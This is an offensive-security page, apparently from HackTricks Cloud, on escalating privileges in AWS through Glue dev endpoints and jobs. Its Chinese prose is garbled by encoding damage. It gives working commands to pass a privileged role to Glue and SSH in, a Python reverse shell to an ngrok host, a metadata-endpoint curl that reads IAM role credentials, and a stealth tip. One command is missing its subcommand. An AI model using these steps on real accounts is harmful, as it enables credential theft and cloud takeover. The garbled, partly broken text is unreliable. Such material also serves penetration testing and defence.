# AWS - Glue æƒé™æå‡

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## glue

### `iam:PassRole`, `glue:CreateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

æ‹¥æœ‰ `iam:`**`PassRole` å’Œ `glue:CreateDevEndpoint`** æƒé™çš„ç”¨æˆ·å¯ä»¥åˆ©ç”¨è¿™äº›æƒé™**è®¾ç½®ä¸€ä¸ªæ–°çš„AWS Glueå¼€å‘ç«¯ç‚¹**ï¼Œ**å°†ä¸€ä¸ªç°æœ‰çš„æœåŠ¡è§’è‰²**ä¸ç‰¹å®šæƒé™åˆ†é…ç»™è¯¥ç«¯ç‚¹ã€‚

è®¾ç½®å®Œæˆåï¼Œ**æ”»å‡»è€…å¯ä»¥SSHè¿›å…¥ç«¯ç‚¹çš„å®ä¾‹**ï¼Œå¹¶çªƒå–åˆ†é…ç»™è¯¥è§’è‰²çš„IAMå‡­è¯ï¼š
```bash
# Create endpoint
aws glue create-dev-endpoint --endpoint-name my_dev_endpoint \
--role-arn arn_of_glue_service_role \
--public-key file:///path/to/my/public/ssh/key.pub

# Get the public address of the instance
## You could also use get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# SSH with the glue user
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```
ä¸ºäº†éšè”½æ€§ï¼Œå»ºè®®åœ¨ Glue è™šæ‹Ÿæœºå†…éƒ¨ä½¿ç”¨ IAM å‡­è¯ã€‚

**æ½œåœ¨å½±å“ï¼š**æå‡åˆ°æŒ‡å®šçš„ Glue æœåŠ¡è§’è‰²æƒé™ã€‚

### `glue:UpdateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

æ‹¥æœ‰ **`glue:UpdateDevEndpoint`** æƒé™çš„ç”¨æˆ·å¯ä»¥**æ›´æ”¹ç°æœ‰ Glue å¼€å‘**ç«¯ç‚¹çš„ SSH å¯†é’¥ï¼Œ**å®ç°å¯¹å…¶çš„ SSH è®¿é—®**ã€‚è¿™å…è®¸æ”»å‡»è€…ä»¥ç«¯ç‚¹é™„åŠ è§’è‰²çš„æƒé™æ‰§è¡Œå‘½ä»¤ï¼Œå¯èƒ½å¯¼è‡´æœªæˆæƒè®¿é—®æˆ–æ“ä½œã€‚
```bash
# Change public key to connect
aws glue --endpoint-name target_endpoint \
--public-key file:///path/to/my/public/ssh/key.pub

# Get the public address of the instance
## You could also use get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# SSH with the glue user
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```
**æ½œåœ¨å½±å“ï¼š** æå‡è‡³ä½¿ç”¨çš„glueæœåŠ¡è§’è‰²æƒé™ã€‚

### `iam:PassRole`ï¼Œ(`glue:CreateJob` | `glue:UpdateJob`)ï¼Œ(`glue:StartJobRun` | `glue:CreateTrigger`)

æ‹¥æœ‰ **`iam:PassRole`** ä»¥åŠ **`glue:CreateJob` æˆ– `glue:UpdateJob`**ï¼Œå’Œ **`glue:StartJobRun` æˆ– `glue:CreateTrigger`** çš„ç”¨æˆ·å¯ä»¥**åˆ›å»ºæˆ–æ›´æ–°AWS Glueä½œä¸š**ï¼Œé™„åŠ ä»»ä½•**GlueæœåŠ¡è´¦æˆ·**ï¼Œå¹¶å¯åŠ¨ä½œä¸šçš„æ‰§è¡Œã€‚ä½œä¸šçš„èƒ½åŠ›åŒ…æ‹¬è¿è¡Œä»»æ„Pythonä»£ç ï¼Œè¿™å¯ä»¥è¢«åˆ©ç”¨æ¥å»ºç«‹ä¸€ä¸ªåå‘shellã€‚ç„¶åï¼Œè¿™ä¸ªåå‘shellå¯ä»¥è¢«ç”¨æ¥æ³„éœ²é™„åŠ åˆ°Glueä½œä¸šçš„è§’è‰²çš„**IAMå‡­è¯**ï¼Œå¯¼è‡´æ½œåœ¨çš„æœªæˆæƒè®¿é—®æˆ–åŸºäºè¯¥è§’è‰²æƒé™çš„æ“ä½œï¼š
```bash
# Content of the python script saved in s3:
#import socket,subprocess,os
#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#s.connect(("2.tcp.ngrok.io",11216))
#os.dup2(s.fileno(),0)
#os.dup2(s.fileno(),1)
#os.dup2(s.fileno(),2)
#p=subprocess.call(["/bin/sh","-i"])
#To get the IAM Role creds run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy


# A Glue role with admin access was created
aws glue create-job \
--name privesctest \
--role arn:aws:iam::93424712358:role/GlueAdmin \
--command '{"Name":"pythonshell", "PythonVersion": "3", "ScriptLocation":"s3://airflow2123/rev.py"}'

# You can directly start the job
aws glue start-job-run --job-name privesctest
# Or you can create a trigger to start it
aws glue create-trigger --name triggerprivesc --type SCHEDULED \
--actions '[{"JobName": "privesctest"}]' --start-on-creation \
--schedule "0/5 * * * * *"  #Every 5mins, feel free to change
```
**æ½œåœ¨å½±å“ï¼š** æå‡è‡³æŒ‡å®šçš„glueæœåŠ¡è§’è‰²æƒé™ã€‚

### `glue:UpdateJob`

ä»…å‡­æ›´æ–°æƒé™ï¼Œæ”»å‡»è€…å°±èƒ½çªƒå–å·²é™„åŠ è§’è‰²çš„IAMå‡­è¯ã€‚

**æ½œåœ¨å½±å“ï¼š** æå‡è‡³é™„åŠ çš„glueæœåŠ¡è§’è‰²æƒé™ã€‚

## å‚è€ƒèµ„æ–™

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
